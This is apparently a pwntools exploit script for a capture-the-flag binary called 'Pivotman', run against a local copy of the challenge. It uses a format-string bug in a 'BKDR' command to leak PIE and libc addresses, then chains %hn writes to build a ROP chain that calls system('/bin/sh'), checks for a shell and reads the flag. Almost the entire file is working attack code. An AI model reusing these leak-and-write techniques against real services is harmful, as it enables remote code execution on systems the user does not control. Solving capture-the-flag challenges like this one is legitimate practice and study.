#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
ELF_PATH = f'{CHALL_DIR}/chall'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'
LIBC_PATH = f'{CHALL_DIR}/libc.so.6'

libc = ELF(LIBC_PATH, checksec=False)

def build_simple_fmt(payload_after_bkdr):
    """Send a BKDR command with arbitrary payload"""
    return b'BKDR ' + payload_after_bkdr

p = process([LD_PATH, ELF_PATH], cwd=CHALL_DIR)
p.recvuntil(b' \r\n', timeout=10)
p.sendline(b'USER ;)')
p.recvuntil(b' \r\n')
p.sendline(b'PASS ;)')
p.recvuntil(b' \r\n')

# Leak PIE + saved_rbp
p.sendline(b'BKDR %2737$p.%2736$p')
resp = p.recvuntil(b' \r\n')
marker = b' BKDR '
idx = resp.find(marker)
after = resp[idx + len(marker):].split(b'.')
pie_base = int(after[0], 16) - 0x3a10
saved_rbp = int(after[1], 16)
log.info(f'PIE: {hex(pie_base)}, saved_rbp: {hex(saved_rbp)}')

# Leak libc
puts_got = pie_base + 0x5ed8
p.sendline(b'BKDR ' + b'%1032$sA' + p64(puts_got))
data = p.recvuntil(b'A', timeout=5)
idx = data.find(b' BKDR ')
leaked = data[idx + 6:-1]
puts_addr = u64(leaked[:8].ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
log.info(f'libc: {hex(libc_base)}')

ret_gadget = libc_base + 0x26699
ret_addr_loc = saved_rbp - 8

# Test: write just ONE half-word (ret_gadget low 16 bits) to ret_addr_loc
# Then check if program survives
test_val = ret_gadget & 0xffff

# Write to ret_addr_loc using %1037$hn (buffer offset 56 = position 1037)
# Need: BKDR (5) + "%Xc%1037$hn" + padding + p64(ret_addr_loc)
# total before addr in input = 5 + len(spec)
# input[total_before] = start of address
# Need input[total_before] = buffer[56 - 3] = buffer[53] → wait, buffer starts at 0
# Position 1037 = buffer[56:64] = input[53:61] (since input starts at buffer[3])
# So total_before (input bytes before addr) = 53
# total_before = 5 + len(spec) + padding = 53

spec = f'%{test_val}c%1037$hn'.encode()
total_before = 5 + len(spec)
padding = 53 - total_before
if padding < 0:
    # Need higher position
    # Position = 1030 + ceil((3 + total_before + addr_padding) / 8)
    # Actually let me calculate the actual position dynamically
    # buffer offset = 3 + total_before + padding
    # We want this to be 8-byte aligned
    # position = 1030 + buffer_offset / 8
    total = 3 + total_before
    pad_to_8 = (8 - total % 8) % 8
    if pad_to_8 == 0:
        pad_to_8 = 8  # ensure addr starts at a new position
    buf_offset = total + pad_to_8
    pos = 1030 + buf_offset // 8
    padding = pad_to_8
    spec = f'%{test_val}c%{pos}$hn'.encode()
    log.info(f'Recalculated: pad={padding}, pos={pos}')

payload = b'BKDR ' + spec + b'.' * padding + p64(ret_addr_loc)
log.info(f'Test payload: {len(payload)}B, target={hex(ret_addr_loc)}, val={hex(test_val)}')

p.sendline(payload)
import time
time.sleep(0.3)
try:
    p.recv(timeout=2)
    p.sendline(b'BKDR TEST')
    resp = p.recv(timeout=2)
    if b'TEST' in resp:
        log.success('Single %hn write works! Program alive.')
    else:
        log.info(f'Unexpected: {resp[:100]}')
except EOFError:
    log.error('Single write crashed! Check addresses.')
    p.close()
    exit()

# Now try 2 writes
log.info('Trying 2 half-word writes...')
hw_writes = [
    (ret_addr_loc + 0, ret_gadget & 0xffff),
    (ret_addr_loc + 2, (ret_gadget >> 16) & 0xffff),
]
hw_writes.sort(key=lambda x: x[1])

# Calculate positions
current = 0
fmt = b''
for idx, (addr, val) in enumerate(hw_writes):
    delta = (val - current) % 0x10000
    if delta == 0:
        delta = 0x10000
    # Use high position estimate
    pos = 1037 + idx  # approximate
    fmt += f'%{delta}c%{pos}$hn'.encode()
    current = val

# Align addresses
total_before_buf = 3 + 5 + len(fmt)
pad = (8 - total_before_buf % 8) % 8
fmt += b'.' * pad

addrs = p64(hw_writes[0][0]) + p64(hw_writes[1][0])
payload = b'BKDR ' + fmt + addrs
log.info(f'2-write payload: {len(payload)}B')

p.sendline(payload)
time.sleep(0.5)
try:
    p.recv(timeout=2)
    p.sendline(b'BKDR TEST2')
    resp = p.recv(timeout=2)
    if b'TEST2' in resp:
        log.success('2 writes work!')
except EOFError:
    log.error('2 writes crashed!')
    p.close()
    exit()

# Try all 16 writes
log.info('Trying all 16 writes...')
writes_dict = {
    ret_addr_loc + 0:   ret_gadget,
    ret_addr_loc + 8:   libc_base + 0x28a55, # pop_rdi
    ret_addr_loc + 16:  libc_base + 0x1abf05, # binsh
    ret_addr_loc + 24:  libc_base + libc.symbols['system'],
}

hw_all = []
for addr, val in writes_dict.items():
    for j in range(4):
        hw_all.append((addr + j*2, (val >> (j*16)) & 0xffff))
hw_all.sort(key=lambda x: x[1])

current = 0
fmt = b''
for idx, (addr, val) in enumerate(hw_all):
    delta = (val - current) % 0x10000
    if delta == 0:
        delta = 0x10000
    pos = 1037 + idx  # will adjust
    fmt += f'%{delta}c%{pos}$hn'.encode()
    current = val

total_before_buf = 3 + 5 + len(fmt)
pad = (8 - total_before_buf % 8) % 8
fmt += b'.' * pad
actual_addr_buf = 3 + 5 + len(fmt)
actual_first_pos = 1030 + actual_addr_buf // 8

# Rebuild with correct positions
current = 0
fmt = b''
for idx, (addr, val) in enumerate(hw_all):
    pos = actual_first_pos + idx
    delta = (val - current) % 0x10000
    if delta == 0:
        delta = 0x10000
    fmt += f'%{delta}c%{pos}$hn'.encode()
    current = val

pad = (8 - (3 + 5 + len(fmt)) % 8) % 8
fmt += b'.' * pad

addrs = b''
for addr, val in hw_all:
    addrs += p64(addr)

payload = b'BKDR ' + fmt + addrs
log.info(f'16-write payload: {len(payload)}B, first_pos={actual_first_pos}')

p.sendline(payload)
time.sleep(0.5)
try:
    p.recv(timeout=2)
except:
    pass

p.sendline(b'QUIT')
time.sleep(0.5)

try:
    p.sendline(b'id')
    resp = p.recv(timeout=3)
    log.info(f'After QUIT: {resp[:200]}')
    if b'uid=' in resp:
        log.success('SHELL!')
        p.sendline(b'cat flag*')
        time.sleep(0.5)
        flag = p.recv(timeout=2)
        log.success(f'Flag: {flag}')
    p.interactive()
except EOFError:
    log.error('Crashed after QUIT')
except:
    log.info('Trying interactive...')
    try: p.interactive()
    except: pass

p.close()
